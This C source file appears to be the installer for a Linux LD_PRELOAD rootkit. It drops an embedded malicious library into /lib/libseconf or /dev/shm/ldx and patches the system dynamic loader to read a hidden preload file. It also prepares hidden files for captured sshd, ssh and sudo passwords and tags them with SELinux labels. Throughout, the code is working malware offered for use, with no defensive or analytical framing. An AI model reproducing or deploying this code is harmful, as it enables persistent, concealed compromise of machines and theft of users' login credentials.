#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <strings.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#ifndef __FreeBSD__
#include <sys/xattr.h>
#else
#define setxattr
#endif

#include "include/arch.h"
#include "build/rkld.h"

#if 0
#define RKLD_HOME         "/lib/libseconf/"
#define RKLD_PATH         RKLD_HOME "libdl.so"
#define MKDIR_HOME        "mkdir " RKLD_HOME
#define CHMOD_HOME        "chmod " RKLD_HOME
#define RKLD_PRELOAD_PATH "RKHOME " ".l"
#define BACKUP_LD         ".backup_ld.so"
#define LD_BACKUP         "cp %s " RKLD_HOME BACKUP_LD
#define TCP_PORTS          RKLD_HOME ".ports"
#define UDP_PORTS          RKLD_HOME ".udp"
#define SSHD_PASS          RKLD_HOME "sshpass.txt"
#define SSH_PASS           RKLD_HOME "sshpass2.txt"
#endif

#if 0
#define __inline__ inline __attribute__((always_inline))
#endif

#define LD_HOME          "/lib/libseconf"
#define LD_LIBRARY_PATH  "/lib/libseconf/libdl.so"
#define MKDIR_HOME       "mkdir /lib/libseconf"
#define CHMOD_HOME       "chown root:8888 /lib/libseconf"
#define NEW_PRELOAD_PATH "/lib/libseconf/.l"
#define LD_BACKUP        "cp %s /lib/libseconf/.backup_ld.so"

#define SHM_HOME         "/dev/shm/ldx"
#define SHM_LIBRARY_PATH "/dev/shm/ldx/libdl.so"
#define SHM_MKDIR_HOME   "mkdir /dev/shm/ldx"
#define SHM_CHMOD_HOME   "chown root:8888 /dev/shm/ldx"
#define SHM_PRELOAD_PATH "/dev/shm/ldx/.l"
#define SHM_LD_BACKUP    "cp -p %s /dev/shm/ldx/.backup_ld.so"

#ifdef __AMD64__
#define LD_LINK          "/lib64/ld-linux-x86-64.so.2"
#define LD_ROOT          "/lib64/%s"
#define LD_LIST          "ls -l /lib64/ld-linux-x86-64.so.2"
#endif

#ifdef __i386__
#define LD_LINK          "/lib/ld-linux.so.2"
#define LD_ROOT          "/lib/%s"
#define LD_LIST          "ls -l /lib/ld-linux.so.2"
#endif

int override_version = 0;

void build_root()
{
	struct stat sb;
	int fd;

	if (stat("/lib/libseconf/.boot.sh", &sb) < 0) {
		fd = open("/lib/libseconf/.boot.sh", O_RDWR|O_CREAT, 0755); close(fd);
	}
	fd = open("/lib/libseconf/.logpam", O_RDWR|O_CREAT, 0644); close(fd);

	/* [sshd passwords] */
	fd = open("/lib/libseconf/sshpass.txt", O_RDWR|O_CREAT, 0644); close(fd);
	setxattr ("/lib/libseconf/sshpass.txt",  "security.selinux", "unconfined_u:object_r:sshd_tmp_t:s0", 36, 0);

	/* [ssh, scp, sudo] */
	fd = open("/lib/libseconf/sshpass2.txt", O_RDWR|O_CREAT, 0777); close(fd);
	setxattr ("/lib/libseconf/sshpass2.txt", "security.selinux", "unconfined_u:object_r:sshd_tmp_t:s0", 36, 0);
	/* ~/.ports */
	fd = open("/lib/libseconf/.ports", O_RDONLY|O_CREAT, 0644);
	fchown(fd, 0, 8888);
	close(fd);
	setxattr ("/lib/libseconf/.ports",       "security.selinux", "unconfined_u:object_r:sshd_tmp_t:s0", 36, 0);
}

int check_ld_version()
{
	FILE *fp;
	char buf[255];
	char *p;

	fp = popen(LD_LIST, "r");
	fread(buf, 1, 255, fp);
	//p = strstr(buf, "ld-2.");
	p = strstr(buf, "ld");
	if (!p) {
		printf("ld: %s\n", buf);
		return 0;
	}
	if (*(p+5) < '5' && *(p+6) == '.') {
		printf("ld error: %s\n", buf);
		if (override_version)
			return 1;
		return 0;
	}
	return 1;
}

void
load_ld(char *ldpath)
{
	char buf[256];
	int ld_version, fd;

	if (!check_ld_version())
		exit(-1);

	fd = open("/proc/version", O_RDONLY);
	read(fd, buf, sizeof(buf));
	close(fd);

	if (strstr(buf, "Debian")) {
		printf("Installing for Debian\n");
	} else if (strstr(buf, "Ubuntu")) {
		printf("Installing for Ubuntu\n");
	} else if (strstr(buf, "el5")) {
		printf("Installing for CentOS 5.x\n");
	} else if (strstr(buf, ".el6.")) {
		printf("Installing for CentOS 6.x\n");
	} else if (strstr(buf, ".el7")) {
		printf("Installing for CentOS 7.x\n");
	} else if (strstr(buf, "SUSE")) {
		printf("Installing for Suse\n");
	} else if (strstr(buf, "Red Hat")) {
		printf("Installing for RedHat 7.x\n");
	} else {
		printf("installing for ?!\n");
	}

	unlink(ldpath);
	fd = open(ldpath, O_RDWR|O_CREAT, 0644);
	write(fd, rkld_so, rkld_so_len);
	fchown(fd, 0, 8888);
	close(fd);
	build_root();
}

void unload_ld(void)
{
	struct stat sb;
	char ldpath[256] = {0};
	char cmd[256];
	char *map, *p;
	int fd;

	unlink("/lib/libseconf/.l");
	readlink(LD_LINK, ldpath, 255);
	if (*ldpath != '/') {
		sprintf(cmd, LD_ROOT, ldpath);
		strcpy(ldpath, cmd);
	}
	sprintf(cmd, "mv /lib/libseconf/.backup_ld.so %s", ldpath);
	system(cmd);
}

void patch_ld(int overwrite, int shm)
{
	struct stat sb;
	char ldpath[256] = {0};
	char cmd[256];
	char *map, *p;
	int fd;

	/* copy ld */
	readlink(LD_LINK, ldpath, 255);
	if (*ldpath != '/') {
		sprintf(cmd, LD_ROOT, ldpath);
		strcpy(ldpath, cmd);
	}
	if (stat(ldpath, &sb) < 0) {
		printf("stat error\n");
		exit(0);
	}
	sprintf(cmd, "cp -p %s /lib/libdsx.so", ldpath);
	system(cmd);

	/* patch copied ld */
	fd = open("/lib/libdsx.so", O_RDWR);
	map = mmap(NULL, sb.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
	if (map == (void *)-1)
		exit(3);
	if (p=memmem(map, sb.st_size, LD_HOME, 14)) {
		if (!overwrite)
			exit(3);
		printf("swap dir\n");
		strcpy(p, SHM_PRELOAD_PATH);
		goto out;
	}
	p = (char *)memmem(map, sb.st_size, "/etc/ld.so.preload", 18);
	if (!p) {
		printf("ld.so not found\n");
		exit(0);
	}

	if (shm)
		strcpy(p, SHM_PRELOAD_PATH);
	else
		strcpy(p, NEW_PRELOAD_PATH);

	/* append /etc/ld.so.preload string */
	munmap(map, sb.st_size);
	lseek(fd, 0, SEEK_END);
	write(fd, "/etc/ld.so.preload", 18);
	close(fd);
out:
	/* set new ld */
	sprintf(cmd, "mv /lib/libdsx.so %s", ldpath);
	system(cmd);
}

/*
 * 1) unlink .ld preload file
 * 2) patch ld.so
 * 3) move libdl.so
 * 4) patch libdl.so
 * 5) enable rk with new /dev/shm/ld/.ld so preload
 */
static __inline__ void rkload_shm()
{
	struct stat sb;
	int fd;
	
	system(SHM_MKDIR_HOME);
	chown(SHM_HOME, 0, 8888);
	printf("new sh\n");

	unlink("/lib/libseconf/.l");
	system(SHM_LD_BACKUP);
	patch_ld(1, 1);

	system("mv /lib/libseconf/libdl.so /dev/shm/ldx");

	load_ld(SHM_LIBRARY_PATH); // write(libdl.so) to /dev/shm/ldx/libdl.so

	fd = open(SHM_PRELOAD_PATH, O_RDWR|O_CREAT, 0644);
	write(fd, SHM_LIBRARY_PATH"\n", strlen(SHM_LIBRARY_PATH)+1);
	close(fd);
}

static __inline__ void rkld_update()
{
	struct stat sb;
	char *ldpath;

	if (!stat(LD_LIBRARY_PATH, &sb))
		ldpath = LD_LIBRARY_PATH;
	else if (!stat(SHM_LIBRARY_PATH, &sb))
		ldpath = SHM_LIBRARY_PATH;
	load_ld(ldpath);
}

static __inline__ void backup_ld()
{
	struct stat sb;
	char ldpath[256] = {0};
	char cmd[512];

	readlink(LD_LINK, ldpath, 255);
	if (*ldpath != '/') {
		sprintf(cmd, LD_ROOT, ldpath);
		strcpy(ldpath, cmd);
	}
	stat(ldpath, &sb);
	sprintf(cmd, LD_BACKUP, ldpath);
	system(cmd);
}

static __inline__ void swap_ldpath(char *oldpath, char *newpath)
{
	struct stat sb;
	char ldpath[256] = {0};
	char cmd[256];
	char *map, *p;
	int fd;

	if (!oldpath || !newpath)
		exit(-1);

	readlink(LD_LINK, ldpath, 255);
	if (*ldpath != '/') {
		sprintf(cmd, LD_ROOT, ldpath);
		strcpy(ldpath, cmd);
	}

	if (stat(ldpath, &sb) < 0) {
		printf("stat error\n");
		exit(0);
	}
	sprintf(cmd, "cp -p %s /lib/libdsx.so", ldpath);
	system(cmd);

	/* patch copied ld */
	fd = open("/lib/libdsx.so", O_RDWR);
	map = mmap(NULL, sb.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
	if (p == (void *)-1)
		exit(3);
	printf("oldpath: %s newpath: %s\n", oldpath, newpath);
	if (!(p=memmem(map, sb.st_size, oldpath, strlen(oldpath)))) {
		printf("can't locate oldpath\n");
		unlink("/lib/libdsx.so");
		exit(-1);
	}
	strcpy(p, newpath);
	munmap(map, sb.st_size);
	sprintf(cmd, "mv /lib/libdsx.so %s", ldpath);
	system(cmd);
}

int main(int argc, char *argv[])
{
	struct stat sb;
	char        ldpath[256]   = {0};
	char        newpath[512];
	char       *oldpath       = NULL;
	char       *ldname        = NULL;
	int         new_ld        = 1;
	int         overwrite     = 0;
	int         fd;
	FILE       *fp;

	if (argv[1] && !strcmp(argv[1], "newpath")) {
		swap_ldpath(argv[2], argv[3]);
		exit(0);
	}

	/* ./r mov /usr/share/man1/rk libname.so /lib/libseconf/.l */
	if (argv[1] && !strcmp(argv[1], "mov")) {
		if (!argv[2]) {
			printf("specify dir\n");
			exit(0);
		}
		if (argv[3])
			ldname = argv[3];

		mkdir(argv[2], 0755);
		snprintf(ldpath, 256, "%s/%s", argv[2], ldname ? ldname : "libdl.so");
		load_ld(ldpath);
		printf("ldpath: %s\n", ldpath);
		if (argv[4])
			oldpath = argv[4];
		else
			oldpath = NEW_PRELOAD_PATH;
		swap_ldpath(oldpath, argv[2]);
		snprintf(newpath, 256, "%s/.l", argv[2]);
		fd = open(NEW_PRELOAD_PATH, O_RDWR|O_CREAT, 0644);
		write(fd, LD_LIBRARY_PATH"\n", strlen(LD_LIBRARY_PATH)+1);
		close(fd);
		exit(0);
	}

	if (argv[1] && !strcmp(argv[1], "sh")) {
		rkload_shm();
		exit(0);
	}

	if (argv[1] && !strcmp(argv[1], "-O"))
		override_version = 1;

	if (argv[1] && !strcmp(argv[1], "-u")) {
		rkld_update();
		exit(0);
	}

	if (!stat("/dev/shm/ldx", &sb)) {
		printf("shm update\n");
		load_ld(SHM_LIBRARY_PATH);
		exit(0);
	}

	if (!stat("/lib/libseconf", &sb))
		new_ld = 0;
	else {
		printf("new hdd\n");
		system(MKDIR_HOME);
		chown(LD_HOME, 0, 8888);
		backup_ld();
	}

	if (argc > 1) {
		if (!strcmp(argv[1], "shred")) {
			unload_ld();
			exit(0);
		} else if (!strcmp(argv[1], "-o")) {
			overwrite=1;
		}
	}

	load_ld(LD_LIBRARY_PATH);
	if (new_ld) {
		/* create new ld.so.preload */
		fd = open(NEW_PRELOAD_PATH, O_RDWR|O_CREAT, 0644);
		write(fd, LD_LIBRARY_PATH"\n", strlen(LD_LIBRARY_PATH)+1);
		close(fd);
		patch_ld(overwrite, 0);
	} else if (overwrite) {
		patch_ld(overwrite, 0);
	}
	exit(0);
}
